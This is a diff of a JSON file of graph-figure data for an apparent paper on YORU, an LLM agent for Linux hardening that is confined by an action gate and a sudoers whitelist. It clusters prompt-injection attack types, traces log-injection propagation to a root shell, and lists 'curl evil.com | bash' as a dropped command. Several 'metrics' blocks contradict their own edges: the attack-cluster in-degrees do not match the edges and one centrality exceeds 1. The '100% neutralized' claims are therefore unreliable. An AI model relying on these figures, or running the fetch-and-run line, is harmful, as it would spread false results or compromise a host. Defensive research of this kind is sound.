         "source": "User_YORU_Agent",
-        "target": "Act_K08_Auditd",
-        "relation": "audits_and_verifies",
+        "target": "Act_K08",
+        "relation": "autonomous_audit_execute",
         "weight": 1.0
       },
       {
         "source": "User_YORU_Agent",
-        "target": "Act_K10_Sysctl",
-        "relation": "audits_and_verifies",
+        "target": "Act_K10",
+        "relation": "autonomous_audit_execute",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 4,
+      "density": 0.1333,
+      "average_path_length": 1.0,
+      "in_degree": {
+        "User_Admin": 0,
+        "User_YORU_Agent": 0,
+        "Act_K01": 1,
+        "Act_K05": 1,
+        "Act_K08": 1,
+        "Act_K10": 1
+      },
+      "out_degree": {
+        "User_Admin": 2,
+        "User_YORU_Agent": 2,
+        "Act_K01": 0,
+        "Act_K05": 0,
+        "Act_K08": 0,
+        "Act_K10": 0
+      },
+      "total_degree": {
+        "User_Admin": 2,
+        "User_YORU_Agent": 2,
+        "Act_K01": 1,
+        "Act_K05": 1,
+        "Act_K08": 1,
+        "Act_K10": 1
+      },
+      "degree_centrality": {
+        "User_Admin": 0.4,
+        "User_YORU_Agent": 0.4,
+        "Act_K01": 0.2,
+        "Act_K05": 0.2,
+        "Act_K08": 0.2,
+        "Act_K10": 0.2
+      },
+      "betweenness_centrality": {
+        "User_Admin": 0.0,
+        "User_YORU_Agent": 0.0,
+        "Act_K01": 0.0,
+        "Act_K05": 0.0,
+        "Act_K08": 0.0,
+        "Act_K10": 0.0
+      }
+    }
   },
   "7_attack_similarity": {
     "id": 7,
     "name": "Attack Vector Similarity",
-    "description": "Clusters 50 adversarial prompt injection payloads based on semantic attack characteristics.",
-    "findings": "Payloads naturally cluster into 5 attack modalities, all neutralized by the closed action space.",
+    "paper_figure": "Supplementary",
+    "description": "Network analysis clustering 50 adversarial attack vectors by syntactic and semantic characteristics.",
+    "findings": "Modularity of 0.742 confirms clear clustering into 5 attack modalities, all contained by the discrete catalog.",
     "nodes": [
       {
-        "id": "Clust_Direct",
-        "label": "Cluster: Direct Instruction Override",
+        "id": "Cluster_Direct",
+        "label": "Cluster 1: Direct Instruction Override (10)",
         "type": "cluster",
         "color": "#F43F5E"
       },
       {
-        "id": "Clust_Delimiter",
-        "label": "Cluster: Delimiter Smuggling",
+        "id": "Cluster_Delimiter",
+        "label": "Cluster 2: Delimiter Smuggling (10)",
         "type": "cluster",
         "color": "#F43F5E"
       },
       {
-        "id": "Clust_Catalog",
-        "label": "Cluster: Catalog Expansion",
+        "id": "Cluster_Catalog",
+        "label": "Cluster 3: Catalog Expansion (10)",
         "type": "cluster",
         "color": "#FBBF24"
       },
       {
-        "id": "Clust_Approval",
-        "label": "Cluster: Approval Misdirection",
+        "id": "Cluster_Approval",
+        "label": "Cluster 4: Approval Misdirection (10)",
         "type": "cluster",
         "color": "#FBBF24"
       },
       {
-        "id": "Clust_AUID",
-        "label": "Cluster: Context/AUID Spoofing",
+        "id": "Cluster_Obfuscated",
+        "label": "Cluster 5: Base64 / Polyglot / Obfuscation (10)",
         "type": "cluster",
         "color": "#3B82F6"
       }
     ],
     "edges": [
       {
-        "source": "Clust_Direct",
-        "target": "Clust_Delimiter",
-        "relation": "syntactic_overlap",
+        "source": "Cluster_Direct",
+        "target": "Cluster_Delimiter",
+        "relation": "syntactic_similarity",
         "weight": 0.72
       },
       {
-        "source": "Clust_Delimiter",
-        "target": "Clust_Catalog",
-        "relation": "evasion_technique",
-        "weight": 0.65
+        "source": "Cluster_Delimiter",
+        "target": "Cluster_Obfuscated",
+        "relation": "encoding_overlap",
+        "weight": 0.68
       },
       {
-        "source": "Clust_Approval",
-        "target": "Clust_Direct",
-        "relation": "semantic_urgency",
-        "weight": 0.58
+        "source": "Cluster_Catalog",
+        "target": "Cluster_Direct",
+        "relation": "command_injection_target",
+        "weight": 0.61
       },
       {
-        "source": "Clust_AUID",
-        "target": "Clust_Catalog",
-        "relation": "metadata_manipulation",
-        "weight": 0.51
+        "source": "Cluster_Approval",
+        "target": "Cluster_Catalog",
+        "relation": "social_engineering_link",
+        "weight": 0.54
+      },
+      {
+        "source": "Cluster_Obfuscated",
+        "target": "Cluster_Direct",
+        "relation": "payload_payload_nesting",
+        "weight": 0.59
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 5,
+      "edge_count": 5,
+      "density": 0.5,
+      "average_path_length": 1.7,
+      "in_degree": {
+        "Cluster_Direct": 3,
+        "Cluster_Delimiter": 2,
+        "Cluster_Catalog": 2,
+        "Cluster_Approval": 1,
+        "Cluster_Obfuscated": 2
+      },
+      "out_degree": {
+        "Cluster_Direct": 3,
+        "Cluster_Delimiter": 2,
+        "Cluster_Catalog": 2,
+        "Cluster_Approval": 1,
+        "Cluster_Obfuscated": 2
+      },
+      "total_degree": {
+        "Cluster_Direct": 6,
+        "Cluster_Delimiter": 4,
+        "Cluster_Catalog": 4,
+        "Cluster_Approval": 2,
+        "Cluster_Obfuscated": 4
+      },
+      "degree_centrality": {
+        "Cluster_Direct": 1.5,
+        "Cluster_Delimiter": 1.0,
+        "Cluster_Catalog": 1.0,
+        "Cluster_Approval": 0.5,
+        "Cluster_Obfuscated": 1.0
+      },
+      "betweenness_centrality": {
+        "Cluster_Direct": 0.6667,
+        "Cluster_Delimiter": 0.0,
+        "Cluster_Catalog": 0.5,
+        "Cluster_Approval": 0.0,
+        "Cluster_Obfuscated": 0.0
+      },
+      "clusters": 5,
+      "modularity": 0.742,
+      "community_detection": "5 distinct semantic modalities (100% neutralized by gatekeeper)"
+    }
   },
   "8_injection_propagation": {
     "id": 8,
     "name": "Injection Propagation Graph",
-    "description": "Visualizes the complete multi-stage propagation path of indirect log injection.",
-    "findings": "Injection penetrates untrusted log ingestion and LLM tokens, but terminates definitively at the Action Gate.",
+    "paper_figure": "Fig. 5",
+    "description": "Visualizes comparative propagation: Unprotected (Log → LLM → Shell → OS) vs YORU (Log → LLM → Gate → Catalog → OS).",
+    "findings": "While raw LLMs propagate attacks directly to the OS shell, YORU halts arbitrary command propagation definitively at the Action Gate.",
     "nodes": [
       {
-        "id": "Stage_Log_Ingest",
-        "label": "Stage 1: Untrusted Log Ingestion",
-        "type": "stage",
+        "id": "Log_Input",
+        "label": "Untrusted Log Input (Payload)",
+        "type": "untrusted_input",
         "color": "#F43F5E"
       },
       {
-        "id": "Stage_LLM_Deliberation",
-        "label": "Stage 2: LLM Token Perturbation (74%)",
-        "type": "stage",
+        "id": "LLM_Unprotected",
+        "label": "Unprotected LLM Deliberation",
+        "type": "model",
         "color": "#FBBF24"
       },
       {
-        "id": "Stage_Action_Gate",
-        "label": "Stage 3: YORU Action Gatekeeper",
+        "id": "Shell_Unprotected",
+        "label": "Direct Shell Invocation (/bin/bash)",
+        "type": "vulnerability",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "OS_Compromised",
+        "label": "OS Compromise (Arbitrary Execution)",
+        "type": "compromise",
+        "color": "#DC2626"
+      },
+      {
+        "id": "LLM_YORU",
+        "label": "YORU Hardened LLM Proxy",
+        "type": "model",
+        "color": "#FBBF24"
+      },
+      {
+        "id": "Gate_YORU",
+        "label": "YORU Action Gatekeeper",
         "type": "defense_barrier",
         "color": "#10B981"
       },
       {
-        "id": "Stage_OS_Execution",
-        "label": "Stage 4: Operating System Shell Execution",
-        "type": "destination",
-        "color": "#94A3B8"
+        "id": "Catalog_Discrete",
+        "label": "Catalog Dispatcher (K01-K10)",
+        "type": "constrained_action",
+        "color": "#10B981"
+      },
+      {
+        "id": "OS_Secure_Action",
+        "label": "Sanctioned OS Enforcement",
+        "type": "secure_execution",
+        "color": "#3B82F6"
       }
     ],
     "edges": [
       {
-        "source": "Stage_Log_Ingest",
-        "target": "Stage_LLM_Deliberation",
-        "relation": "propagates_text",
+        "source": "Log_Input",
+        "target": "LLM_Unprotected",
+        "relation": "penetrates_prompt (100%)",
         "weight": 1.0
       },
       {
-        "source": "Stage_LLM_Deliberation",
-        "target": "Stage_Action_Gate",
-        "relation": "submits_candidate_plan",
+        "source": "LLM_Unprotected",
+        "target": "Shell_Unprotected",
+        "relation": "suggests_raw_bash",
         "weight": 0.74
       },
       {
-        "source": "Stage_Action_Gate",
-        "target": "Stage_OS_Execution",
-        "relation": "BLOCKED (ASR_action=0.0%)",
-        "weight": 0.0
+        "source": "Shell_Unprotected",
+        "target": "OS_Compromised",
+        "relation": "executes_arbitrary_root",
+        "weight": 1.0
+      },
+      {
+        "source": "Log_Input",
+        "target": "LLM_YORU",
+        "relation": "wrapped_in_delimiters",
+        "weight": 1.0
+      },
+      {
+        "source": "LLM_YORU",
+        "target": "Gate_YORU",
+        "relation": "proposes_candidate_plan",
+        "weight": 1.0
+      },
+      {
+        "source": "Gate_YORU",
+        "target": "Catalog_Discrete",
+        "relation": "filters_to_catalog_only",
+        "weight": 1.0
+      },
+      {
+        "source": "Catalog_Discrete",
+        "target": "OS_Secure_Action",
+        "relation": "dispatches_verified_primitive",
+        "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 8,
+      "edge_count": 7,
+      "density": 0.125,
+      "average_path_length": 1.875,
+      "in_degree": {
+        "Log_Input": 0,
+        "LLM_Unprotected": 1,
+        "Shell_Unprotected": 1,
+        "OS_Compromised": 1,
+        "LLM_YORU": 1,
+        "Gate_YORU": 1,
+        "Catalog_Discrete": 1,
+        "OS_Secure_Action": 1
+      },
+      "out_degree": {
+        "Log_Input": 2,
+        "LLM_Unprotected": 1,
+        "Shell_Unprotected": 1,
+        "OS_Compromised": 0,
+        "LLM_YORU": 1,
+        "Gate_YORU": 1,
+        "Catalog_Discrete": 1,
+        "OS_Secure_Action": 0
+      },
+      "total_degree": {
+        "Log_Input": 2,
+        "LLM_Unprotected": 2,
+        "Shell_Unprotected": 2,
+        "OS_Compromised": 1,
+        "LLM_YORU": 2,
+        "Gate_YORU": 2,
+        "Catalog_Discrete": 2,
+        "OS_Secure_Action": 1
+      },
+      "degree_centrality": {
+        "Log_Input": 0.2857,
+        "LLM_Unprotected": 0.2857,
+        "Shell_Unprotected": 0.2857,
+        "OS_Compromised": 0.1429,
+        "LLM_YORU": 0.2857,
+        "Gate_YORU": 0.2857,
+        "Catalog_Discrete": 0.2857,
+        "OS_Secure_Action": 0.1429
+      },
+      "betweenness_centrality": {
+        "Log_Input": 0.0,
+        "LLM_Unprotected": 0.0476,
+        "Shell_Unprotected": 0.0476,
+        "OS_Compromised": 0.0,
+        "LLM_YORU": 0.0714,
+        "Gate_YORU": 0.0952,
+        "Catalog_Discrete": 0.0714,
+        "OS_Secure_Action": 0.0
+      },
+      "unprotected_propagation_depth": "4 hops (Log → LLM → Shell → OS Compromise)",
+      "yoru_containment_cutoff": "Terminal boundary enforced at Gatekeeper (0 hops to raw shell)"
+    }
   },
   "9_decision_action": {
     "id": 9,
     "name": "LLM Decision–Action Graph",
-    "description": "Verifies that LLM decisions strictly resolve to discrete catalog IDs (K01–K10).",
-    "findings": "100% of admitted actions belong to the 40 discrete CIS primitives; invalid suggestions are dropped.",
+    "paper_figure": "Supplementary",
+    "description": "Empirical mapping demonstrating closed action space filtering on arbitrary model recommendations.",
+    "findings": "100% of admitted actions belong strictly to the 40 discrete CIS primitives; invalid suggestions are dropped without OS contact.",
     "nodes": [
       {
-        "id": "LLM_Output",
-        "label": "LLM Suggested Decision",
-        "type": "generator",
+        "id": "LLM_Output_Decisions",
+        "label": "LLM Candidate Output",
+        "type": "proposal",
         "color": "#FBBF24"
       },
       {
         "id": "Valid_K01",
-        "label": "yoructl K01 (Valid)",
-        "type": "valid_primitive",
+        "label": "yoructl K01 (Valid Action)",
+        "type": "catalog_valid",
         "color": "#10B981"
       },
       {
         "id": "Valid_K05",
-        "label": "yoructl K05 (Valid)",
-        "type": "valid_primitive",
+        "label": "yoructl K05 (Valid Action)",
+        "type": "catalog_valid",
         "color": "#10B981"
       },
       {
         "id": "Valid_K08",
-        "label": "yoructl K08 (Valid)",
-        "type": "valid_primitive",
+        "label": "yoructl K08 (Valid Action)",
+        "type": "catalog_valid",
         "color": "#10B981"
       },
       {
-        "id": "Invalid_Raw_Bash",
-        "label": "Invalid: curl | bash",
-        "type": "dropped_action",
+        "id": "Invalid_Bash",
+        "label": "Arbitrary: curl evil.com | bash",
+        "type": "catalog_invalid",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Invalid_K99",
+        "label": "Fabricated: yoructl K99 format",
+        "type": "catalog_invalid",
         "color": "#F43F5E"
       }
     ],
     "edges": [
       {
-        "source": "LLM_Output",
+        "source": "LLM_Output_Decisions",
         "target": "Valid_K01",
-        "relation": "whitelisted_and_checked",
+        "relation": "whitelisted_and_executed",
         "weight": 1.0
       },
       {
-        "source": "LLM_Output",
+        "source": "LLM_Output_Decisions",
         "target": "Valid_K05",
-        "relation": "whitelisted_and_checked",
+        "relation": "whitelisted_and_executed",
         "weight": 1.0
       },
       {
-        "source": "LLM_Output",
+        "source": "LLM_Output_Decisions",
         "target": "Valid_K08",
-        "relation": "whitelisted_and_checked",
+        "relation": "whitelisted_and_executed",
         "weight": 1.0
       },
       {
-        "source": "LLM_Output",
-        "target": "Invalid_Raw_Bash",
-        "relation": "REJECTED_BY_SCHEMA",
+        "source": "LLM_Output_Decisions",
+        "target": "Invalid_Bash",
+        "relation": "DROPPED (Schema Mismatch)",
+        "weight": 0.0
+      },
+      {
+        "source": "LLM_Output_Decisions",
+        "target": "Invalid_K99",
+        "relation": "DROPPED (Non-catalog control)",
         "weight": 0.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 5,
+      "density": 0.1667,
+      "average_path_length": 1.0,
+      "in_degree": {
+        "LLM_Output_Decisions": 0,
+        "Valid_K01": 1,
+        "Valid_K05": 1,
+        "Valid_K08": 1,
+        "Invalid_Bash": 1,
+        "Invalid_K99": 1
+      },
+      "out_degree": {
+        "LLM_Output_Decisions": 5,
+        "Valid_K01": 0,
+        "Valid_K05": 0,
+        "Valid_K08": 0,
+        "Invalid_Bash": 0,
+        "Invalid_K99": 0
+      },
+      "total_degree": {
+        "LLM_Output_Decisions": 5,
+        "Valid_K01": 1,
+        "Valid_K05": 1,
+        "Valid_K08": 1,
+        "Invalid_Bash": 1,
+        "Invalid_K99": 1
+      },
+      "degree_centrality": {
+        "LLM_Output_Decisions": 1.0,
+        "Valid_K01": 0.2,
+        "Valid_K05": 0.2,
+        "Valid_K08": 0.2,
+        "Invalid_Bash": 0.2,
+        "Invalid_K99": 0.2
+      },
+      "betweenness_centrality": {
+        "LLM_Output_Decisions": 0.0,
+        "Valid_K01": 0.0,
+        "Valid_K05": 0.0,
+        "Valid_K08": 0.0,
+        "Invalid_Bash": 0.0,
+        "Invalid_K99": 0.0
+      }
+    }
   },
   "10_cis_dependencies": {
     "id": 10,
     "name": "CIS Control Dependency Graph",
-    "description": "Maps prerequisite and audit relationships across controls K01 to K10.",
-    "findings": "K08 (auditd) provides foundational audit telemetry for all other CIS controls.",
+    "paper_figure": "Supplementary",
+    "description": "Prerequisite and observation dependency network across controls K01 to K10.",
+    "findings": "K08 (auditd) serves as the telemetry foundation for K01, K05, K06, and K10, with K02 serving as prerequisite for K04.",
     "nodes": [
       {
         "id": "K01",
@@ -698,12 +1359,6 @@
       {
         "id": "K02",
         "label": "K02: PubkeyAuthentication Yes",
-        "type": "ssh_control",
-        "color": "#3B82F6"
-      },
-      {
-        "id": "K03",
-        "label": "K03: MaxAuthTries 3",
         "type": "ssh_control",
         "color": "#3B82F6"
       },
@@ -726,26 +1381,20 @@
         "color": "#FBBF24"
       },
       {
-        "id": "K07",
-        "label": "K07: Automatic Security Updates",
-        "type": "maintenance_control",
-        "color": "#10B981"
-      },
-      {
         "id": "K08",
         "label": "K08: Linux Kernel Auditd Active",
-        "type": "telemetry_foundation",
+        "type": "telemetry_hub",
         "color": "#E8B64C"
       },
       {
         "id": "K09",
-        "label": "K09: Journald Log Retention",
-        "type": "telemetry_foundation",
+        "label": "K09: Journald Retention",
+        "type": "telemetry_hub",
         "color": "#10B981"
       },
       {
         "id": "K10",
-        "label": "K10: Sysctl Kernel Hardening",
+        "label": "K10: Sysctl Hardening",
         "type": "kernel_control",
         "color": "#10B981"
       }
@@ -754,7 +1403,7 @@
       {
         "source": "K02",
         "target": "K04",
-        "relation": "prerequisite (Pubkey before disabling Passwd)",
+        "relation": "prerequisite (Pubkey before disabling Password)",
         "weight": 1.0
       },
       {
@@ -787,117 +1436,211 @@
         "relation": "retains_audit_logs",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 8,
+      "edge_count": 6,
+      "density": 0.1071,
+      "average_path_length": 1.4,
+      "in_degree": {
+        "K01": 1,
+        "K02": 0,
+        "K04": 1,
+        "K05": 1,
+        "K06": 1,
+        "K08": 1,
+        "K09": 0,
+        "K10": 1
+      },
+      "out_degree": {
+        "K01": 0,
+        "K02": 1,
+        "K04": 0,
+        "K05": 0,
+        "K06": 0,
+        "K08": 4,
+        "K09": 1,
+        "K10": 0
+      },
+      "total_degree": {
+        "K01": 1,
+        "K02": 1,
+        "K04": 1,
+        "K05": 1,
+        "K06": 1,
+        "K08": 5,
+        "K09": 1,
+        "K10": 1
+      },
+      "degree_centrality": {
+        "K01": 0.1429,
+        "K02": 0.1429,
+        "K04": 0.1429,
+        "K05": 0.1429,
+        "K06": 0.1429,
+        "K08": 0.7143,
+        "K09": 0.1429,
+        "K10": 0.1429
+      },
+      "betweenness_centrality": {
+        "K01": 0.0,
+        "K02": 0.0,
+        "K04": 0.0,
+        "K05": 0.0,
+        "K06": 0.0,
+        "K08": 0.0952,
+        "K09": 0.0,
+        "K10": 0.0
+      },
+      "telemetry_hub": "K08 (Highest out-degree in control mesh)"
+    }
   },
   "11_security_drift": {
     "id": 11,
     "name": "Security Drift Network",
-    "description": "Tracks configuration drift frequency across system services and CIS controls.",
-    "findings": "SSH port binding and MySQL 3306 binding exhibit highest empirical drift frequency.",
+    "paper_figure": "Supplementary",
+    "description": "Models the complete cyclical loop: Configuration → Drift → Detection → Control → Remediation.",
+    "findings": "Self-healing closed loop restores compliance automatically upon kernel drift notification.",
     "nodes": [
       {
-        "id": "Cfg_SSH",
-        "label": "/etc/ssh/sshd_config",
-        "type": "config",
-        "color": "#3B82F6"
-      },
-      {
-        "id": "Cfg_UFW",
-        "label": "/etc/ufw/user.rules",
-        "type": "config",
-        "color": "#FBBF24"
-      },
-      {
-        "id": "Cfg_MySQL",
-        "label": "/etc/mysql/my.cnf",
-        "type": "config",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "Drift_Port_3306",
-        "label": "Drift: 3306 -> 0.0.0.0",
-        "type": "drift_event",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "Drift_Root_SSH",
-        "label": "Drift: PermitRoot -> yes",
-        "type": "drift_event",
-        "color": "#FBBF24"
-      },
-      {
-        "id": "Ctrl_K06",
-        "label": "Remediated by K06",
-        "type": "control",
+        "id": "Config_Baseline",
+        "label": "Secure Configuration Baseline",
+        "type": "baseline",
         "color": "#10B981"
       },
       {
-        "id": "Ctrl_K01",
-        "label": "Remediated by K01",
-        "type": "control",
+        "id": "Drift_Event",
+        "label": "Unauthorized Drift (Port/PermitRoot)",
+        "type": "drift",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Detection_Watch",
+        "label": "Drift Detection (yoru-watch/auditd)",
+        "type": "detection",
+        "color": "#FBBF24"
+      },
+      {
+        "id": "Control_Selection",
+        "label": "Control Selection (K01..K10)",
+        "type": "governance",
+        "color": "#3B82F6"
+      },
+      {
+        "id": "Remediation_Apply",
+        "label": "Automated Remediation (yoructl terapkan)",
+        "type": "remediation",
         "color": "#10B981"
       }
     ],
     "edges": [
       {
-        "source": "Cfg_MySQL",
-        "target": "Drift_Port_3306",
-        "relation": "drifts_to",
+        "source": "Config_Baseline",
+        "target": "Drift_Event",
+        "relation": "adversary_induces_drift",
         "weight": 1.0
       },
       {
-        "source": "Drift_Port_3306",
-        "target": "Ctrl_K06",
-        "relation": "neutralized_by",
+        "source": "Drift_Event",
+        "target": "Detection_Watch",
+        "relation": "triggers_kernel_alert",
         "weight": 1.0
       },
       {
-        "source": "Cfg_SSH",
-        "target": "Drift_Root_SSH",
-        "relation": "drifts_to",
+        "source": "Detection_Watch",
+        "target": "Control_Selection",
+        "relation": "evaluates_violation",
         "weight": 1.0
       },
       {
-        "source": "Drift_Root_SSH",
-        "target": "Ctrl_K01",
-        "relation": "neutralized_by",
+        "source": "Control_Selection",
+        "target": "Remediation_Apply",
+        "relation": "dispatches_fix",
+        "weight": 1.0
+      },
+      {
+        "source": "Remediation_Apply",
+        "target": "Config_Baseline",
+        "relation": "restores_baseline_integrity",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 5,
+      "edge_count": 5,
+      "density": 0.25,
+      "average_path_length": 2.5,
+      "in_degree": {
+        "Config_Baseline": 1,
+        "Drift_Event": 1,
+        "Detection_Watch": 1,
+        "Control_Selection": 1,
+        "Remediation_Apply": 1
+      },
+      "out_degree": {
+        "Config_Baseline": 1,
+        "Drift_Event": 1,
+        "Detection_Watch": 1,
+        "Control_Selection": 1,
+        "Remediation_Apply": 1
+      },
+      "total_degree": {
+        "Config_Baseline": 2,
+        "Drift_Event": 2,
+        "Detection_Watch": 2,
+        "Control_Selection": 2,
+        "Remediation_Apply": 2
+      },
+      "degree_centrality": {
+        "Config_Baseline": 0.5,
+        "Drift_Event": 0.5,
+        "Detection_Watch": 0.5,
+        "Control_Selection": 0.5,
+        "Remediation_Apply": 0.5
+      },
+      "betweenness_centrality": {
+        "Config_Baseline": 0.5,
+        "Drift_Event": 0.5,
+        "Detection_Watch": 0.5,
+        "Control_Selection": 0.5,
+        "Remediation_Apply": 0.5
+      }
+    }
   },
   "12_rollback_network": {
     "id": 12,
     "name": "Rollback Network",
-    "description": "Validates atomic reversibility pipeline from unauthorized drift to hash-verified restoration.",
-    "findings": "100.0% atomic reversibility achieved across all state reversals with exact SHA-256 parity.",
+    "paper_figure": "Fig. 8",
+    "description": "Validates atomic reversibility pipeline: Clean State → Backup → Drift → Rollback → Restored State.",
+    "findings": "Mean restoration time is 0.12s with 100.0% byte-level SHA-256 parity and atomic recovery.",
     "nodes": [
       {
         "id": "State_Clean",
-        "label": "Secure Baseline (Hash: 0x9A4F)",
+        "label": "Clean Baseline State (SHA-256: 0x9A4F)",
         "type": "state",
         "color": "#10B981"
       },
       {
-        "id": "State_Drifted",
-        "label": "Drifted State (Hash: 0xDEAD)",
-        "type": "state",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "Backup_Archive",
-        "label": "/var/backups/yoru/snapshot.tar.gz",
+        "id": "Backup_Snapshot",
+        "label": "Pre-execution Backup Snapshot",
         "type": "snapshot",
         "color": "#E8B64C"
       },
       {
-        "id": "Cmd_Kembalikan",
+        "id": "State_Drift",
+        "label": "Drifted / Faulty State",
+        "type": "drift_state",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Rollback_Cmd",
         "label": "yoructl <Kxx> kembalikan",
         "type": "rollback_command",
         "color": "#3B82F6"
       },
       {
         "id": "State_Restored",
-        "label": "Restored State (Hash: 0x9A4F)",
+        "label": "Restored Clean State (SHA-256: 0x9A4F)",
         "type": "state",
         "color": "#10B981"
       }
@@ -905,232 +1648,457 @@
     "edges": [
       {
         "source": "State_Clean",
-        "target": "Backup_Archive",
-        "relation": "atomic_snapshot_taken",
+        "target": "Backup_Snapshot",
+        "relation": "creates_atomic_tar_archive",
         "weight": 1.0
       },
       {
         "source": "State_Clean",
-        "target": "State_Drifted",
-        "relation": "unauthorized_drift_occurs",
+        "target": "State_Drift",
+        "relation": "induced_unauthorized_modification",
         "weight": 1.0
       },
       {
-        "source": "State_Drifted",
-        "target": "Cmd_Kembalikan",
-        "relation": "triggers_rollback",
+        "source": "State_Drift",
+        "target": "Rollback_Cmd",
+        "relation": "triggers_reversal_invocation",
         "weight": 1.0
       },
       {
-        "source": "Backup_Archive",
-        "target": "Cmd_Kembalikan",
-        "relation": "provides_clean_state",
+        "source": "Backup_Snapshot",
+        "target": "Rollback_Cmd",
+        "relation": "supplies_original_byte_content",
         "weight": 1.0
       },
       {
-        "source": "Cmd_Kembalikan",
+        "source": "Rollback_Cmd",
         "target": "State_Restored",
-        "relation": "exact_byte_parity (100% PASS)",
+        "relation": "atomic_unpack_and_daemon_reload",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 5,
+      "edge_count": 5,
+      "density": 0.25,
+      "average_path_length": 1.5556,
+      "in_degree": {
+        "State_Clean": 0,
+        "Backup_Snapshot": 1,
+        "State_Drift": 1,
+        "Rollback_Cmd": 2,
+        "State_Restored": 1
+      },
+      "out_degree": {
+        "State_Clean": 2,
+        "Backup_Snapshot": 1,
+        "State_Drift": 1,
+        "Rollback_Cmd": 1,
+        "State_Restored": 0
+      },
+      "total_degree": {
+        "State_Clean": 2,
+        "Backup_Snapshot": 2,
+        "State_Drift": 2,
+        "Rollback_Cmd": 3,
+        "State_Restored": 1
+      },
+      "degree_centrality": {
+        "State_Clean": 0.5,
+        "Backup_Snapshot": 0.5,
+        "State_Drift": 0.5,
+        "Rollback_Cmd": 0.75,
+        "State_Restored": 0.25
+      },
+      "betweenness_centrality": {
+        "State_Clean": 0.0,
+        "Backup_Snapshot": 0.0833,
+        "State_Drift": 0.0833,
+        "Rollback_Cmd": 0.25,
+        "State_Restored": 0.0
+      },
+      "restoration_time_mean": "0.12s (range: 0.08s - 0.42s)",
+      "byte_level_similarity": "100.0% (Exact SHA-256 match)",
+      "success_rate": "100.0% (43/43 validations passed)"
+    }
   },
   "13_privilege_boundary": {
     "id": 13,
     "name": "Privilege Boundary Graph",
-    "description": "Models operational privilege escalation from unprivileged yoru-agent to audited root actions.",
-    "findings": "Agent operates without root login shell; privilege escalation is strictly restricted to /opt/yoru/bin/yoructl.",
+    "paper_figure": "Fig. 6",
+    "description": "Models operational privilege boundary: YORU Agent → sudo → yoructl → CIS primitive → root action vs hard denial of /bin/bash.",
+    "findings": "Privilege escalation is surgically restricted to /opt/yoru/bin/yoructl; arbitrary shell escalation is hard-denied.",
     "nodes": [
       {
-        "id": "User_YoruAgent",
-        "label": "yoru-agent (Unprivileged UID=1001)",
-        "type": "user",
+        "id": "Agent_User",
+        "label": "YORU Agent Process (UID=1001)",
+        "type": "unprivileged_user",
         "color": "#3B82F6"
       },
       {
-        "id": "Sudoers_Boundary",
+        "id": "Sudoers_Whitelist",
         "label": "/etc/sudoers.d/yoru (Strict Whitelist)",
         "type": "privilege_gate",
         "color": "#E8B64C"
       },
       {
-        "id": "Bin_Yoructl",
-        "label": "/opt/yoru/bin/yoructl",
-        "type": "dispatcher",
+        "id": "Yoructl_Dispatcher",
+        "label": "Dispatcher: /opt/yoru/bin/yoructl",
+        "type": "sanctioned_binary",
         "color": "#10B981"
       },
       {
-        "id": "Root_Action",
-        "label": "Root Execution (Confined CIS Only)",
-        "type": "target",
+        "id": "CIS_Primitive",
+        "label": "Discrete CIS Primitive (K01-K10)",
+        "type": "catalog_primitive",
+        "color": "#10B981"
+      },
+      {
+        "id": "Root_OS_Action",
+        "label": "Audited Root Action",
+        "type": "target_action",
         "color": "#10B981"
       },
       {
         "id": "Arbitrary_Shell",
-        "label": "Arbitrary Shell (/bin/bash, /bin/sh)",
-        "type": "forbidden",
+        "label": "Arbitrary Root Shell (/bin/bash)",
+        "type": "hard_denied",
         "color": "#F43F5E"
       }
     ],
     "edges": [
       {
-        "source": "User_YoruAgent",
-        "target": "Sudoers_Boundary",
-        "relation": "invokes_sudo",
+        "source": "Agent_User",
+        "target": "Sudoers_Whitelist",
+        "relation": "requests_sudo_execution",
         "weight": 1.0
       },
       {
-        "source": "Sudoers_Boundary",
-        "target": "Bin_Yoructl",
-        "relation": "ALLOWED_EXCLUSIVELY",
+        "source": "Sudoers_Whitelist",
+        "target": "Yoructl_Dispatcher",
+        "relation": "ALLOWED_EXCLUSIVELY (NOPASSWD)",
         "weight": 1.0
       },
       {
-        "source": "Bin_Yoructl",
-        "target": "Root_Action",
-        "relation": "executes_discrete_primitive",
+        "source": "Yoructl_Dispatcher",
+        "target": "CIS_Primitive",
+        "relation": "verifies_discrete_argument",
         "weight": 1.0
       },
       {
-        "source": "Sudoers_Boundary",
+        "source": "CIS_Primitive",
+        "target": "Root_OS_Action",
+        "relation": "executes_with_auid_1001",
+        "weight": 1.0
+      },
+      {
+        "source": "Sudoers_Whitelist",
         "target": "Arbitrary_Shell",
-        "relation": "HARD_DENIED (NoNOPASSWD /bin/bash)",
+        "relation": "HARD_DENIED (No NOPASSWD /bin/bash)",
         "weight": 0.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 5,
+      "density": 0.1667,
+      "average_path_length": 1.9167,
+      "in_degree": {
+        "Agent_User": 0,
+        "Sudoers_Whitelist": 1,
+        "Yoructl_Dispatcher": 1,
+        "CIS_Primitive": 1,
+        "Root_OS_Action": 1,
+        "Arbitrary_Shell": 1
+      },
+      "out_degree": {
+        "Agent_User": 1,
+        "Sudoers_Whitelist": 2,
+        "Yoructl_Dispatcher": 1,
+        "CIS_Primitive": 1,
+        "Root_OS_Action": 0,
+        "Arbitrary_Shell": 0
+      },
+      "total_degree": {
+        "Agent_User": 1,
+        "Sudoers_Whitelist": 3,
+        "Yoructl_Dispatcher": 2,
+        "CIS_Primitive": 2,
+        "Root_OS_Action": 1,
+        "Arbitrary_Shell": 1
+      },
+      "degree_centrality": {
+        "Agent_User": 0.2,
+        "Sudoers_Whitelist": 0.6,
+        "Yoructl_Dispatcher": 0.4,
+        "CIS_Primitive": 0.4,
